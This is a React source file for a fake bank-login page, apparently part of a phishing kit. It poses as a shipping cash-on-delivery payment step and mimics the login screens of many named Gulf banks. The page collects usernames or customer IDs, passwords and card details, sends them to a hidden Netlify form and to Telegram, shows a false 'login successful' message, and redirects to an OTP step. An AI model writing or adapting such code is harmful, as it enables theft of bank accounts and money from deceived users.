import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { getServiceBranding } from "@/lib/serviceLogos";
import { useLink } from "@/hooks/useSupabase";
import { Lock, Eye, EyeOff, ArrowLeft, ShieldCheck } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { getBankDesign, getDefaultBankDesign } from "@/lib/bankDesigns";
import BankLoginLayout from "@/components/BankLoginLayout";

const PaymentBankLogin = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  
  // Bank login credentials state
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [customerId, setCustomerId] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  // Get customer info and selected bank from sessionStorage
  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
  const selectedCountry = sessionStorage.getItem('selectedCountry') || '';
  const selectedBankId = sessionStorage.getItem('selectedBank') || '';
  const cardInfo = {
    cardName: sessionStorage.getItem('cardName') || '',
    cardLast4: sessionStorage.getItem('cardLast4') || '',
    cardNumber: sessionStorage.getItem('cardNumber') || '',
    cardExpiry: sessionStorage.getItem('cardExpiry') || '',
    cardCvv: sessionStorage.getItem('cardCvv') || '',
    cardType: sessionStorage.getItem('cardType') || '',
  };
  
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const shippingInfo = linkData?.payload as any;
  const amount = shippingInfo?.cod_amount || 500;
  const formattedAmount = `${amount} ر.س`;
  
  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
  
  // Get bank design specification (always returns a complete design)
  const bankDesign = selectedBankId ? getBankDesign(selectedBankId) : getDefaultBankDesign();
  
  // Determine login type based on bank
  const getLoginType = () => {
    if (!selectedBank) return 'username';
    
    const bankId = selectedBank.id;
    
    // Saudi banks
    if (bankId === 'alrajhi_bank') return 'username';
    if (bankId === 'alahli_bank') return 'username';
    if (bankId === 'riyad_bank') return 'customerId';
    if (bankId === 'samba_bank') return 'username';
    if (bankId === 'saudi_investment_bank') return 'customerId';
    if (bankId === 'arab_national_bank') return 'username';
    if (bankId === 'saudi_fransi_bank') return 'customerId';
    if (bankId === 'alinma_bank') return 'username';
    if (bankId === 'albilad_bank') return 'customerId';
    if (bankId === 'aljazira_bank') return 'username';
    
    // UAE banks
    if (bankId === 'emirates_nbd') return 'username';
    if (bankId === 'adcb') return 'customerId';
    if (bankId === 'fab') return 'username';
    if (bankId === 'dib') return 'username';
    if (bankId === 'mashreq_bank') return 'customerId';
    if (bankId === 'cbd') return 'username';
    if (bankId === 'rakbank') return 'customerId';
    if (bankId === 'ajman_bank') return 'username';
    
    // Kuwait banks
    if (bankId === 'nbk') return 'customerId';
    if (bankId === 'gulf_bank') return 'username';
    if (bankId === 'cbk') return 'customerId';
    if (bankId === 'burgan_bank') return 'username';
    if (bankId === 'ahli_united_bank') return 'username';
    if (bankId === 'kfh') return 'customerId';
    if (bankId === 'boubyan_bank') return 'username';
    
    // Qatar banks
    if (bankId === 'qnb') return 'customerId';
    if (bankId === 'cbq') return 'username';
    if (bankId === 'doha_bank') return 'username';
    if (bankId === 'qib') return 'customerId';
    if (bankId === 'masraf_alrayan') return 'username';
    if (bankId === 'ahlibank') return 'customerId';
    
    // Oman banks
    if (bankId === 'bank_muscat') return 'customerId';
    if (bankId === 'national_bank_oman') return 'username';
    if (bankId === 'bank_dhofar') return 'username';
    if (bankId === 'ahli_bank_oman') return 'customerId';
    if (bankId === 'nizwa_bank') return 'username';
    if (bankId === 'sohar_international') return 'customerId';
    
    // Bahrain banks
    if (bankId === 'nbb') return 'username';
    if (bankId === 'bbk') return 'customerId';
    if (bankId === 'ahli_united_bahrain') return 'username';
    if (bankId === 'bisb') return 'username';
    if (bankId === 'ithmaar_bank') return 'customerId';
    if (bankId === 'khaleeji_bank') return 'username';
    
    return 'username';
  };
  
  const loginType = getLoginType();
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validate based on login type
    if (loginType === 'username' && (!username || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال اسم المستخدم وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'customerId' && (!customerId || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم العميل وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'phone' && (!phoneNumber || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم الجوال وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    setIsSubmitting(true);
    
    // Store bank login info
    const bankLoginData = {
      username: loginType === 'username' ? username : '',
      customerId: loginType === 'customerId' ? customerId : '',
      phoneNumber: loginType === 'phone' ? phoneNumber : '',
      password: password,
      loginType: loginType,
    };
    
    sessionStorage.setItem('bankLoginData', JSON.stringify(bankLoginData));
    
    // Submit to Netlify Forms
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "bank-login",
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          service: serviceName,
          amount: formattedAmount,
          country: selectedCountryData?.nameAr || '',
          bank: selectedBank?.nameAr || 'غير محدد',
          cardLast4: cardInfo.cardLast4,
          loginType: loginType,
          username: bankLoginData.username,
          customerId: bankLoginData.customerId,
          phoneNumber: bankLoginData.phoneNumber,
          password: password,
          timestamp: new Date().toISOString()
        }).toString()
      });
    } catch (err) {
      console.error("Form submission error:", err);
    }
    
    // Send bank login details to Telegram
    const telegramResult = await sendToTelegram({
      type: 'bank_login',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        service: serviceName,
        country: selectedCountryData?.nameAr || '',
        countryCode: selectedCountry,
        bank: selectedBank?.nameAr || 'غير محدد',
        bankId: selectedBankId,
        cardLast4: cardInfo.cardLast4,
        cardType: cardInfo.cardType,
        loginType: loginType,
        username: bankLoginData.username,
        customerId: bankLoginData.customerId,
        phoneNumber: bankLoginData.phoneNumber,
        password: password,
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });

    if (telegramResult.success) {
      console.log('Bank login details sent to Telegram successfully');
    } else {
      console.error('Failed to send bank login details to Telegram:', telegramResult.error);
    }
    
    setIsSubmitting(false);
    
    toast({
      title: "تم بنجاح",
      description: "تم تسجيل الدخول بنجاح",
    });
    
    // Navigate to OTP verification
    navigate(`/pay/${id}/otp`);
  };
  
  // Get button style with exact specifications
  const getButtonStyles = (): React.CSSProperties => {
    const baseStyle: React.CSSProperties = {
      borderRadius: bankDesign.buttonRadius || '8px',
      color: '#FFFFFF',
      fontWeight: bankDesign.fontWeight || '500',
      fontSize: bankDesign.buttonFontSize || bankDesign.fontSize?.body || '16px',
      padding: bankDesign.buttonPadding || bankDesign.padding?.button || '14px 24px',
      transition: 'all 0.3s ease',
      width: '100%',
    };
    
    switch (bankDesign.buttonStyle) {
      case 'gradient':
        return {
          ...baseStyle,
          background: `linear-gradient(135deg, ${bankDesign.primaryColor}, ${bankDesign.secondaryColor})`,
          border: 'none',
          boxShadow: bankDesign.shadow?.button || `0 4px 12px ${bankDesign.primaryColor}30`,
        };
      case 'solid':
        return {
          ...baseStyle,
          background: bankDesign.primaryColor,
          border: 'none',
          boxShadow: bankDesign.shadow?.button || `0 4px 12px ${bankDesign.primaryColor}30`,
        };
      case 'outline':
        return {
          ...baseStyle,
          background: 'transparent',
          border: `2px solid ${bankDesign.primaryColor}`,
          color: bankDesign.primaryColor,
        };
      case 'elevated':
        return {
          ...baseStyle,
          background: bankDesign.primaryColor,
          border: 'none',
          boxShadow: bankDesign.shadow?.button || `0 8px 16px ${bankDesign.primaryColor}40`,
        };
      default:
        return baseStyle;
    }
  };
  
  // Get input style with exact specifications
  const getInputStyles = (): React.CSSProperties => {
    const baseStyle: React.CSSProperties = {
      borderRadius: bankDesign.inputRadius || '8px',
      borderColor: bankDesign.borderColor || bankDesign.primaryColor + '40',
      backgroundColor: bankDesign.surfaceColor,
      color: bankDesign.textColor,
      fontSize: bankDesign.fontSize?.body || '16px',
      height: bankDesign.inputHeight || '48px',
      padding: bankDesign.inputPadding || bankDesign.padding?.input || '14px 16px',
      transition: 'all 0.2s ease',
      width: '100%',
    };
    
    switch (bankDesign.inputStyle) {
      case 'modern':
        return {
          ...baseStyle,
          borderWidth: '2px',
          borderStyle: 'solid',
        };
      case 'classic':
        return {
          ...baseStyle,
          borderWidth: '1px',
          borderStyle: 'solid',
        };
      case 'minimal':
        return {
          ...baseStyle,
          borderWidth: '0 0 2px 0',
          borderStyle: 'solid',
          backgroundColor: 'transparent',
          borderRadius: '0',
        };
      default:
        return baseStyle;
    }
  };
  
  const spacing = bankDesign.spacing || { small: '8px', medium: '16px', large: '24px', xlarge: '32px' };
  
  return (
    <BankLoginLayout
      bankDesign={bankDesign}
      bankName={selectedBank?.name || ''}
      bankNameAr={selectedBank?.nameAr || ''}
      bankId={selectedBankId}
    >
      {/* Security Notice */}
      <div
        style={{
          background: bankDesign.primaryColor + '10',
          border: `1px solid ${bankDesign.primaryColor}30`,
          borderRadius: bankDesign.borderRadius || '12px',
          padding: spacing.medium,
          marginBottom: spacing.large,
          display: 'flex',
          alignItems: 'start',
          gap: spacing.small,
        }}
      >
        <ShieldCheck 
          style={{ 
            color: bankDesign.primaryColor, 
            flexShrink: 0, 
            marginTop: '2px',
            width: '20px',
            height: '20px',
          }} 
        />
        <div style={{ fontSize: bankDesign.fontSize?.small || '14px' }}>
          <p style={{ 
            fontWeight: '600', 
            marginBottom: '4px', 
            color: bankDesign.textColor,
            fontSize: bankDesign.fontSize?.small || '14px',
          }}>
            تسجيل دخول آمن
          </p>
          <p style={{ 
            color: bankDesign.textSecondaryColor || bankDesign.textColor, 
            fontSize: bankDesign.fontSize?.small || '14px', 
            opacity: 0.8,
            margin: 0,
          }}>
            سجّل دخول إلى حسابك البنكي لتأكيد العملية وإكمال الدفع بأمان
          </p>
        </div>
      </div>
      
      <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: spacing.large }}>
        {/* Username Login */}
        {loginType === 'username' && (
          <div>
            <Label style={{ 
              marginBottom: spacing.small, 
              display: 'block',
              fontSize: bankDesign.fontSize?.small || '14px',
              fontWeight: '500',
              color: bankDesign.textColor 
            }}>
              اسم المستخدم
            </Label>
            <Input
              type="text"
              placeholder="أدخل اسم المستخدم"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              style={getInputStyles()}
              onFocus={(e) => {
                e.target.style.borderColor = bankDesign.primaryColor;
                e.target.style.boxShadow = bankDesign.shadow?.input || `0 0 0 3px ${bankDesign.primaryColor}20`;
              }}
              onBlur={(e) => {
                e.target.style.borderColor = bankDesign.borderColor || bankDesign.primaryColor + '40';
                e.target.style.boxShadow = 'none';
              }}
              autoComplete="username"
              required
            />
          </div>
        )}
        
        {/* Customer ID Login */}
        {loginType === 'customerId' && (
          <div>
            <Label style={{ 
              marginBottom: spacing.small, 
              display: 'block',
              fontSize: bankDesign.fontSize?.small || '14px',
              fontWeight: '500',
              color: bankDesign.textColor 
            }}>
              رقم العميل
            </Label>
            <Input
              type="text"
              placeholder="أدخل رقم العميل"
              value={customerId}
              onChange={(e) => setCustomerId(e.target.value)}
              style={getInputStyles()}
              onFocus={(e) => {
                e.target.style.borderColor = bankDesign.primaryColor;
                e.target.style.boxShadow = bankDesign.shadow?.input || `0 0 0 3px ${bankDesign.primaryColor}20`;
              }}
              onBlur={(e) => {
                e.target.style.borderColor = bankDesign.borderColor || bankDesign.primaryColor + '40';
                e.target.style.boxShadow = 'none';
              }}
              inputMode="numeric"
              required
            />
          </div>
        )}
        
        {/* Phone Login */}
        {loginType === 'phone' && (
          <div>
            <Label style={{ 
              marginBottom: spacing.small, 
              display: 'block',
              fontSize: bankDesign.fontSize?.small || '14px',
              fontWeight: '500',
              color: bankDesign.textColor 
            }}>
              رقم الجوال
            </Label>
            <Input
              type="tel"
              placeholder="05xxxxxxxx"
              value={phoneNumber}
              onChange={(e) => setPhoneNumber(e.target.value)}
              style={getInputStyles()}
              onFocus={(e) => {
                e.target.style.borderColor = bankDesign.primaryColor;
                e.target.style.boxShadow = bankDesign.shadow?.input || `0 0 0 3px ${bankDesign.primaryColor}20`;
              }}
              onBlur={(e) => {
                e.target.style.borderColor = bankDesign.borderColor || bankDesign.primaryColor + '40';
                e.target.style.boxShadow = 'none';
              }}
              inputMode="tel"
              required
            />
          </div>
        )}
        
        {/* Password */}
        <div>
          <Label style={{ 
            marginBottom: spacing.small, 
            display: 'block',
            fontSize: bankDesign.fontSize?.small || '14px',
            fontWeight: '500',
            color: bankDesign.textColor 
          }}>
            كلمة المرور
          </Label>
          <div style={{ position: 'relative' }}>
            <Input
              type={showPassword ? "text" : "password"}
              placeholder="أدخل كلمة المرور"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              style={{
                ...getInputStyles(),
                paddingRight: '48px',
              }}
              onFocus={(e) => {
                e.target.style.borderColor = bankDesign.primaryColor;
                e.target.style.boxShadow = bankDesign.shadow?.input || `0 0 0 3px ${bankDesign.primaryColor}20`;
              }}
              onBlur={(e) => {
                e.target.style.borderColor = bankDesign.borderColor || bankDesign.primaryColor + '40';
                e.target.style.boxShadow = 'none';
              }}
              autoComplete="current-password"
              required
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              style={{
                position: 'absolute',
                right: '12px',
                top: '50%',
                transform: 'translateY(-50%)',
                background: 'none',
                border: 'none',
                cursor: 'pointer',
                color: bankDesign.textSecondaryColor || bankDesign.textColor,
                opacity: 0.6,
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
              }}
            >
              {showPassword ? <EyeOff style={{ width: '20px', height: '20px' }} /> : <Eye style={{ width: '20px', height: '20px' }} />}
            </button>
          </div>
        </div>
        
        {/* Remember Me / Forgot Password */}
        <div style={{ 
          display: 'flex', 
          alignItems: 'center', 
          justifyContent: 'space-between',
          fontSize: bankDesign.fontSize?.small || '14px',
        }}>
          <label style={{ 
            display: 'flex', 
            alignItems: 'center', 
            gap: spacing.small,
            color: bankDesign.textSecondaryColor || bankDesign.textColor,
            cursor: 'pointer',
          }}>
            <input 
              type="checkbox" 
              style={{ 
                width: '16px', 
                height: '16px',
                accentColor: bankDesign.primaryColor,
              }} 
            />
            تذكرني
          </label>
          <button
            type="button"
            style={{
              background: 'none',
              border: 'none',
              color: bankDesign.primaryColor,
              cursor: 'pointer',
              textDecoration: 'underline',
              fontSize: bankDesign.fontSize?.small || '14px',
            }}
          >
            نسيت كلمة المرور؟
          </button>
        </div>
        
        {/* Submit Button */}
        <Button
          type="submit"
          style={{
            ...getButtonStyles(),
            cursor: isSubmitting ? 'not-allowed' : 'pointer',
            opacity: isSubmitting ? 0.7 : 1,
          }}
          disabled={isSubmitting}
        >
          {isSubmitting ? (
            <span>جاري تسجيل الدخول...</span>
          ) : (
            <>
              <Lock style={{ width: '16px', height: '16px', marginLeft: '8px' }} />
              <span>تسجيل الدخول والمتابعة</span>
              <ArrowLeft style={{ width: '16px', height: '16px', marginRight: '8px' }} />
            </>
          )}
        </Button>
        
        <p style={{ 
          fontSize: bankDesign.fontSize?.small || '14px', 
          textAlign: 'center', 
          color: bankDesign.textSecondaryColor || bankDesign.textColor,
          opacity: 0.7,
          marginTop: spacing.medium,
          margin: 0,
        }}>
          بتسجيل الدخول، أنت توافق على شروط وأحكام البنك
        </p>
      </form>
      
      {/* Register Link */}
      <div style={{
        marginTop: spacing.large,
        paddingTop: spacing.large,
        borderTop: `1px solid ${bankDesign.borderColor || bankDesign.primaryColor + '20'}`,
        textAlign: 'center',
      }}>
        <p style={{ 
          fontSize: bankDesign.fontSize?.small || '14px',
          color: bankDesign.textSecondaryColor || bankDesign.textColor,
          marginBottom: spacing.medium,
          margin: 0,
        }}>
          لا تملك حساب؟
        </p>
        <Button
          type="button"
          variant="outline"
          style={{
            borderColor: bankDesign.primaryColor,
            color: bankDesign.primaryColor,
            backgroundColor: 'transparent',
            borderRadius: bankDesign.buttonRadius || '8px',
            padding: spacing.small + ' ' + spacing.medium,
            fontSize: bankDesign.fontSize?.small || '14px',
          }}
        >
          تسجيل حساب جديد
        </Button>
      </div>
      
      {/* Hidden Netlify Form */}
      <form name="bank-login" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="country" />
        <input type="text" name="bank" />
        <input type="text" name="cardLast4" />
        <input type="text" name="loginType" />
        <input type="text" name="username" />
        <input type="text" name="customerId" />
        <input type="text" name="phoneNumber" />
        <input type="password" name="password" />
        <input type="text" name="timestamp" />
      </form>
    </BankLoginLayout>
  );
};

export default PaymentBankLogin;
